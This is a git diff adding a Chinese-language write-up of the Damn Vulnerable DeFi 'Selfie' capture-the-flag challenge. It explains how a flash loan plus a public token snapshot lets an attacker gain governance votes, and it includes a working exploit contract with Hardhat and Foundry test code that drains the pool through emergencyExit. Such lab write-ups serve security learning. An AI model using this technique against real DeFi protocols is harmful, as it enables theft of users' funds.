@@ -29,6 +29,7 @@ $ yarn install
 $ git clone git@github.com:StErMi/forge-damn-vulnerable-defi.git
 $ cd forge-damn-vulnerable-defi
 $ git submodule update --init --recursive
+$ forge remappings
 ```
 
 - Code solution under the `src/test`
@@ -470,3 +471,168 @@ it('Execution', async function () {
 ### 参考资料
 
 - [ERC20Snapshot](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Snapshot)
+
+## 6. Selfie
+
+> A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.
+>
+> You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.
+
+- `governance` 才能调用 `emergencyExit()` 转出 pool 中的资金
+
+    ```js
+    modifier onlyGovernance() {
+        if (msg.sender != address(governance))
+            revert CallerNotGovernance();
+        _;
+    }
+
+    function emergencyExit(address receiver) external onlyGovernance {
+        uint256 amount = token.balanceOf(address(this));
+        token.transfer(receiver, amount);
+
+        emit FundsDrained(receiver, amount);
+    }
+    ```
+
+- `SimpleGovernance.executeAction()` 可以执行自定义调用
+
+    ```js
+    function executeAction(uint256 actionId) external payable returns (bytes memory) {
+        if(!_canBeExecuted(actionId))
+            revert CannotExecute(actionId);
+
+        GovernanceAction storage actionToExecute = _actions[actionId];
+        actionToExecute.executedAt = uint64(block.timestamp);
+
+        emit ActionExecuted(actionId, msg.sender);
+
+        (bool success, bytes memory returndata) = actionToExecute.target.call{value: actionToExecute.value}(actionToExecute.data);
+        if (!success) {
+            if (returndata.length > 0) {
+                assembly {
+                    revert(add(0x20, returndata), mload(returndata))
+                }
+            } else {
+                revert ActionFailed(actionId);
+            }
+        }
+
+        return returndata;
+    }
+    ```
+
+- 创建新的 action 需要创建者获取足够的票数，票数即创建者在上一快照 `governanceToken` 的持有量
+
+    ```js
+    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
+        if (!_hasEnoughVotes(msg.sender))
+            revert NotEnoughVotes(msg.sender);
+
+        if (target == address(this))
+            revert InvalidTarget();
+        
+        if (data.length > 0 && target.code.length == 0)
+            revert TargetMustHaveCode();
+
+        actionId = _actionCounter;
+
+        _actions[actionId] = GovernanceAction({
+            target: target,
+            value: value,
+            proposedAt: uint64(block.timestamp),
+            executedAt: 0,
+            data: data
+        });
+
+        unchecked { _actionCounter++; }
+
+        emit ActionQueued(actionId, msg.sender);
+    }
+
+    function _hasEnoughVotes(address who) private view returns (bool) {
+        uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);
+        uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;
+        return balance > halfTotalSupply;
+    }
+    ```
+
+- 任何人都可以进行快照 uwu 那么在闪电贷时快照，即可获得充足的票数，在下一次快照前 `queueAction()` 就可以啦w
+
+    ```js
+    function snapshot() public returns (uint256 lastSnapshotId) {
+        lastSnapshotId = _snapshot();
+        _lastSnapshotId = lastSnapshotId;
+    }
+    ```
+
+### Exploit
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "openzeppelin-contracts/interfaces/IERC3156FlashBorrower.sol";
+import "../DamnValuableTokenSnapshot.sol";
+import "./ISimpleGovernance.sol";
+import "./SelfiePool.sol";
+
+contract SelfieHack is IERC3156FlashBorrower {
+
+    function exploit(address instance, address pool) external returns (uint actionId) {
+        SelfiePool(pool).flashLoan(
+            this,
+            address(SelfiePool(pool).token()),
+            1500000 ether,
+            ""
+        );
+        actionId = ISimpleGovernance(instance).queueAction(
+            pool,
+            0,
+            abi.encodeWithSignature("emergencyExit(address)", msg.sender)
+        );
+    }
+
+    function onFlashLoan(
+        address,
+        address token,
+        uint256 amount,
+        uint256,
+        bytes calldata
+    ) external returns (bytes32) {
+        DamnValuableTokenSnapshot(token).snapshot();
+        DamnValuableTokenSnapshot(token).approve(msg.sender, amount);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+}
+```
+
+#### Hardhat
+
+```js
+it('Execution', async function () {
+    const SelfieHack = await (await ethers.getContractFactory('SelfieHack', player)).deploy();
+    // The return value of a non-pure non-view function is available only when the function is called and validated on-chain.
+    await SelfieHack.exploit(governance.address, pool.address); 
+
+    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
+    await governance.executeAction(await governance.getActionCounter() - 1);
+});
+```
+
+#### Foundry
+
+```js
+function exploit() internal override {
+    // Sets attacker as msg.sender for all subsequent calls until stopPrank is called
+    vm.startPrank(attacker);
+
+    SelfieHack hack = new SelfieHack();
+    uint actionId = hack.exploit(address(governance), address(pool));
+
+    vm.stopPrank();
+
+    skip(governance.getActionDelay()); // 2 days
+    governance.executeAction(actionId);
+}
+```
